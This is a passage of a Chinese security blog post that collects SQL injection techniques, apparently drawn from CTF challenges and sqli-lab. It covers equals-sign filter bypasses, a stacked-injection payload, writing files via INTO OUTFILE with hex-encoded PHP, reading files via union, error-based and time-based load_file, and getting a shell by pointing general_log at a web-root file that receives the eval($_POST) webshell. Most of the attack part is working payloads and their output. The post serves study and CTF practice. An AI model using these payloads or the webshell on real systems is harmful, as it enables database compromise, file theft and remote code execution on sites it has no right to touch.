<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 0;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 1;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| ctf_test   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>等于号被过滤</strong></li>
</ul>
<p>可以用like,regexp,between…and..,rlike进行代替，用法如下：<br><a href="https://imgchr.com/i/ZZ7QC4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png" alt="ZZ7QC4.md.png"></a></p>
<p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(locate(&#39;ro&#39;, substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(position(&#39;ro&#39; IN substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(instr(substring(user(),1,2),&#39;ro&#39;)&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>堆叠注入</strong></li>
</ul>
<p>例子：强网杯2019随便注</p>
<p>payload如下形式</p>
<p>查询字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;use information_schema;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name&#x3D;&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>查询内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>load_file&amp;into outfile</strong></li>
</ul>
<p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p>
<p><strong>into outfile</strong></p>
<p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p>
<p>2.拥有file权限</p>
<p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</code>查看信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv&#x3D;null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv&#x3D;&#x2F;tmp&#x2F;(导入导出只允许在&#x2F;tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv&#x3D;(任意导入导出)</span><br></pre></td></tr></table></figure>

<p><code>into outfile</code>有四种写入文件的方式</p>
<p><strong>通过union注入写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;2.php&#39;;</span><br><span class="line">Query OK, 2 rows affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/Ze50qf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png" alt="Ze50qf.md.png"></a></p>
<p><strong>通过FIELDS TERMINATED BY写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p>
<p><a href="https://imgchr.com/i/ZeT9xA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png" alt="ZeT9xA.md.png"></a></p>
<p>可以看到在一个字段的情况下无法添加我们的webshell。</p>
<p><strong>通过LINES TERMINATED BY写入文件</strong></p>
<p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/ZeTbWQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png" alt="ZeTbWQ.md.png"></a></p>
<p><strong>LINES STARTING BY写入shell</strong></p>
<p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>load_file</strong></p>
<p>1.要求拥有file权限</p>
<p>2.知道文件所在绝对路径</p>
<p>3.同样受<code>secure_file_priv</code>限制</p>
<p><strong>union注入进行load_file</strong></p>
<p>效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| flag                 |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1                    |</span><br><span class="line">| &lt;?php phpinfo();?&gt;1</span><br><span class="line"> |</span><br><span class="line">+----------------------+</span><br><span class="line">2 rows in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>利用报错注入进行load_file</strong></p>
<p>测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and updatexml(1,concat(0x7e,(select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&lt;?php phpinfo();?&gt;1</span><br><span class="line">~&#39;</span><br></pre></td></tr></table></figure>

<p>成功得到文件内容</p>
<p><strong>利用时间盲注进行load_file</strong></p>
<p>测试如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and if(mid((select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),1,1)&#x3D;&#39;&lt;&#39;,sleep(3),1);</span><br><span class="line">Empty set, 1 warning (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>成功延时3s，可配合脚本得到文件内容。</p>
<p><strong>利用load_file扫描文件是否存在</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~0~&#39;</span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;1.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~1~&#39;</span><br></pre></td></tr></table></figure>

<p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p>
<p><strong>另类写读文件</strong></p>
<p><strong>dumpfile</strong> 官方文档如下：</p>
<p><a href="https://imgchr.com/i/Zmk139" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmk139.md.png" alt="Zmk139.md.png"></a></p>
<p><strong>危险变量导致getshell</strong></p>
<p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;; 查看配置信息</span><br><span class="line"></span><br><span class="line">set global general_log&#x3D;on 开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;F:\\phpstudy\\www\\shell.php&#39;;</span><br><span class="line"></span><br><span class="line">select &#39;&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>最终<code>shell.php</code>为我们的<code>webshell</code></p>
<p><a href="https://imgchr.com/i/ZmGHSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png" alt="ZmGHSI.md.png"></a></p>
<h3 id="组合拳思考"><a href="#组合拳思考" class="headerlink" title="组合拳思考"></a>组合拳思考</h3><p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p>
<p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p>
<p>以<code>Sqli-lab less-1</code>为例</p>
<p>首先通过<code>polygon</code>函数进行报错</p>
<p><a href="https://imgchr.com/i/Zmuiy4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png" alt="Zmuiy4.md.png"></a></p>
<p>接着通过列重复来报错</p>
<p><a href="https://imgchr.com/i/ZmK8vF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png" alt="ZmK8vF.md.png"></a></p>
<p><a href="https://imgchr.com/i/ZmKyKe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png" alt="ZmKyKe.md.png"></a></p>
<p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p>
<p><a href="https://imgchr.com/i/ZmMzFI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png" alt="ZmMzFI.md.png"></a></p>
<p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p>
<p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
<p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" data-id="ckabsu38i001wkkvr403fglv1" class="article-share-link" data-share="baidu" data-title="SQL注入有趣姿势总结">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Redis&amp;Fastcgi未授权访问漏洞
        
      </div>
    </a>
  
  
    <a href="/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2016-0CTF-piapiapia(反序列化逃逸字符)</div>
    </a>
  
</nav>

  
</article>


  <section id="comments">
    <div id="ds-thread" class="ds-thread" data-thread-key="2019/06/29/SQL注入有趣姿势总结/" data-title="SQL注入有趣姿势总结" data-url="http://yoursite.com/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"></div>
  </section>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
